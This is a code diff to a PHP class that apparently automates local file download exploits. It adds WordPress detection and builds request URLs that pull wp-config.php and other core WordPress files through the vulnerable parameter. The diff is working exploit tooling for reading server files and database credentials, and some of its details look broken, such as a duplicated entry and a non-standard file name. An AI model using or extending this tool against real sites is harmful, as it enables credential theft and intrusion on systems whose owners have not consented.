@@ -173,6 +173,52 @@ class DownloadByLocalFileDownload
         return $query;
     }
 
+    protected function checkIfWordPressFile($body){
+        $isValid = preg_match("/(define\('WP_USE_THEMES', true\);)/", $body, $m);
+        if ($isValid) {
+           return true;
+        }
+        return false;
+
+
+    }
+
+    protected function getWordPressFile($url){
+        $arrBaseExploit=parse_url($this->getBaseExploit($url));
+        if(!$url){
+            $url=$this->urlBaseExploit;
+            $arrBaseExploit=parse_url($url);
+        }
+
+        if($arrBaseExploit["path"]=="/"){
+            return array();
+        }
+
+        $ext=explode(".",$arrBaseExploit["path"]);
+
+        if(!isset($ext[1])){
+
+            return array();
+        }
+        $urlFinal[]=$arrBaseExploit["scheme"]."://".$arrBaseExploit["host"].$arrBaseExploit["path"]."?".$arrBaseExploit["query"]."wp-config.php";
+        $urlFinal[]=$arrBaseExploit["scheme"]."://".$arrBaseExploit["host"].$arrBaseExploit["path"]."?".$arrBaseExploit["query"]."wp-settings.php";
+        $urlFinal[]=$arrBaseExploit["scheme"]."://".$arrBaseExploit["host"].$arrBaseExploit["path"]."?".$arrBaseExploit["query"]."wp-login.php";
+        $urlFinal[]=$arrBaseExploit["scheme"]."://".$arrBaseExploit["host"].$arrBaseExploit["path"]."?".$arrBaseExploit["query"]."wp-activate.php";
+        $urlFinal[]=$arrBaseExploit["scheme"]."://".$arrBaseExploit["host"].$arrBaseExploit["path"]."?".$arrBaseExploit["query"]."wp-blog-header.php";
+        $urlFinal[]=$arrBaseExploit["scheme"]."://".$arrBaseExploit["host"].$arrBaseExploit["path"]."?".$arrBaseExploit["query"]."wp-comments-post.php";
+        $urlFinal[]=$arrBaseExploit["scheme"]."://".$arrBaseExploit["host"].$arrBaseExploit["path"]."?".$arrBaseExploit["query"]."wp-config-sample.php";
+        $urlFinal[]=$arrBaseExploit["scheme"]."://".$arrBaseExploit["host"].$arrBaseExploit["path"]."?".$arrBaseExploit["query"]."wp-config.php";
+        $urlFinal[]=$arrBaseExploit["scheme"]."://".$arrBaseExploit["host"].$arrBaseExploit["path"]."?".$arrBaseExploit["query"]."wp-cron.php";
+        $urlFinal[]=$arrBaseExploit["scheme"]."://".$arrBaseExploit["host"].$arrBaseExploit["path"]."?".$arrBaseExploit["query"]."wp-link-opml.php";
+        $urlFinal[]=$arrBaseExploit["scheme"]."://".$arrBaseExploit["host"].$arrBaseExploit["path"]."?".$arrBaseExploit["query"]."wp-load.php";
+        $urlFinal[]=$arrBaseExploit["scheme"]."://".$arrBaseExploit["host"].$arrBaseExploit["path"]."?".$arrBaseExploit["query"]."wp-mail.php";
+        $urlFinal[]=$arrBaseExploit["scheme"]."://".$arrBaseExploit["host"].$arrBaseExploit["path"]."?".$arrBaseExploit["query"]."wp-signup.php";
+        $urlFinal[]=$arrBaseExploit["scheme"]."://".$arrBaseExploit["host"].$arrBaseExploit["path"]."?".$arrBaseExploit["query"]."wp-trackback.php";
+        $urlFinal[]=$arrBaseExploit["scheme"]."://".$arrBaseExploit["host"].$arrBaseExploit["path"]."?".$arrBaseExploit["query"]."wp-xmlrpc.php";
+
+       return $urlFinal;
+
+    }
 
     protected function getMoreLinksByBody($body=false,$urlFile=false){
 
@@ -185,6 +231,9 @@ class DownloadByLocalFileDownload
         $cacheUrlFiles1=$this->getIncludes($body,$urlFile);
         $cacheUrlFiles2=$this->getLinks($body);
         $cacheUrlFiles3=$this->findIndexs($urlFile);
+        if($this->checkIfWordPressFile($body)){
+            $cacheUrlFiles4=$this->getWordPressFile($urlFile);
+        }
 
         if(!empty($cacheUrlFiles1)){
             $cacheUrlFiles=array_merge($cacheUrlFiles,$cacheUrlFiles1);
@@ -194,6 +243,9 @@ class DownloadByLocalFileDownload
         }
         if(!empty($cacheUrlFiles3)){
             $cacheUrlFiles=array_merge($cacheUrlFiles,$cacheUrlFiles3);
+        }
+        if(isset($cacheUrlFiles4) AND !empty($cacheUrlFiles4)){
+            $cacheUrlFiles=array_merge($cacheUrlFiles,$cacheUrlFiles4);
         }
 
         return $cacheUrlFiles;
